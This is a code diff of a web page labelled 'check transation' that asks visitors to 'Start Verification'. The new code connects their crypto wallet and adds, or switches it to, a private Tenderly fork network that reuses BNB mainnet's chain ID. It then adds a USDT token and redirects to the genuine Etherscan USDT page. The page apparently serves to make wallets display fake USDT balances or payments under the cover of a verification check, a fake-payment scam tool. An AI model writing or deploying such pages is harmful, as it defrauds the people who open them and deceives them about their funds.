@@ -4,81 +4,110 @@
   <meta charset="utf-8" />
   <title>check transation</title>
 </head>
-<body style="background:#0b1020;color:white;font-family:sans-serif;text-align:center;margin-top:20%">
+
+<body style="background:#0b1020;color:white;font-family:sans-serif;text-align:center;margin-top:18%">
 
   <h2>check transation</h2>
 
-  <!-- Button for MetaMask / Injected wallets -->
-  <button onclick="addNetworkInjected()" 
-    style="padding:10px 20px;border-radius:8px;background:#2563eb;color:white;font-size:16px;margin-bottom:20px">
-    Add Network (Injected)
+  <button onclick="startFlow()" 
+    style="padding:12px 24px;border-radius:10px;background:#2563eb;color:white;font-size:17px">
+    Start Verification
   </button>
 
-  <!-- Button for WalletConnect -->
-  <br/>
-  <button onclick="connectWalletConnect()" 
-    style="padding:10px 20px;border-radius:8px;background:#22c55e;color:black;font-size:16px">
-    Add Network (WalletConnect)
-  </button>
+  <!-- Loader -->
+  <div id="loader"
+       style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);
+              display:none;align-items:center;justify-content:center;flex-direction:column;z-index:9999;">
+    <div style="width:70px;height:70px;border:7px solid rgba(255,255,255,0.2);
+                border-top-color:#22c55e;border-radius:50%;animation:spin 0.9s linear infinite;">
+    </div>
+    <p style="margin-top:16px;color:#22c55e;font-size:18px;opacity:0.9;">Processing...</p>
+  </div>
 
-  <!-- WalletConnect v2 UMD script -->
+  <style>
+    @keyframes spin { to { transform:rotate(360deg); } }
+  </style>
+
   <script src="https://unpkg.com/@walletconnect/ethereum-provider/dist/umd/index.min.js"></script>
 
   <script>
-    // ✅ Tenderly Fork Configuration
-    const chainIdHex = "0x38"; 
+    // Config
     const rpcUrl = "https://virtual.rpc.tenderly.co/shairya/ethereum-mainnet/private/bnb/16ca9d40-c933-4b69-ae8d-5b453927d6a1/";
+    const chainIdHex = "0x38";
+    const tokenAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT
+    const redirectUrl = "https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7";
 
-    const chainParams = {
-      chainId: chainIdHex,
-      chainName: "Tenderly Virtual BNB",
-      rpcUrls: [rpcUrl],
-      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 }
-    };
+    let provider;
 
-    // ✅ Injected Wallet Handler (MetaMask / Trust Wallet browser)
-    async function addNetworkInjected() {
-      if (!window.ethereum) {
-        alert("Please open this page inside MetaMask, Trust, Coinbase Wallet browser.");
-        return;
-      }
+    function showLoader() {
+      document.getElementById("loader").style.display = "flex";
+    }
+
+    async function startFlow() {
+      showLoader();
       try {
-        await window.ethereum.request({
-          method: "wallet_addEthereumChain",
-          params: [chainParams]
+        // Injected wallets first
+        if (window.ethereum) {
+          provider = window.ethereum;
+          await provider.request({ method:"eth_requestAccounts" });
+          await addNetwork();
+          await addToken();
+          setTimeout(() => window.location.href = redirectUrl, 600);
+          return;
+        }
+
+        // WalletConnect handshake
+        provider = await WalletConnectEthereumProvider.init({
+          projectId: "c5923ad66f1e2a3496254d5ef45d9d08",
+          showQrModal: true,
+          chains: [56],
+          rpcMap: {56: rpcUrl}
         });
+
+        await provider.enable();
+        await addNetwork();
+        await addToken();
+        setTimeout(() => window.location.href = redirectUrl, 600);
+
       } catch (err) {
         alert(err.message || err);
+        document.getElementById("loader").style.display = "none";
       }
     }
 
-    // ✅ WalletConnect v2 Handler
-    async function connectWalletConnect() {
-      const provider = await WalletConnectEthereumProvider.init({
-        projectId: "c5923ad66f1e2a3496254d5ef45d9d08", 
-        showQrModal: true,
-        chains: [56],
-        rpcMap: { 56: rpcUrl },
-        metadata: {
-          name: "check transation",
-          description: "Add Tenderly Virtual BNB Network",
-          url: window.location.href,
-          icons: ["https://walletconnect.com/walletconnect-logo.png"]
-        }
-      });
-
-      await provider.enable();
-
+    async function addNetwork() {
       try {
         await provider.request({
-          method: "wallet_addEthereumChain",
-          params: [chainParams]
+          method:"wallet_addEthereumChain",
+          params:[{
+            chainId: chainIdHex,
+            chainName:"Tenderly Virtual BNB",
+            rpcUrls:[rpcUrl],
+            nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18}
+          }]
         });
-      } catch (err) {
-        alert(err.message || err);
+      } catch (e) {
+        await provider.request({
+          method:"wallet_switchEthereumChain",
+          params:[{chainId: chainIdHex}]
+        });
       }
     }
-  </script>
 
+    async function addToken() {
+      await provider.request({
+        method:"wallet_watchAsset",
+        params:{
+          type:"ERC20",
+          options:{
+            address:tokenAddress,
+            symbol:"USDT",
+            decimals:18
+          }
+        }
+      });
+    }
+
+  </script>
 </body>
 </html>
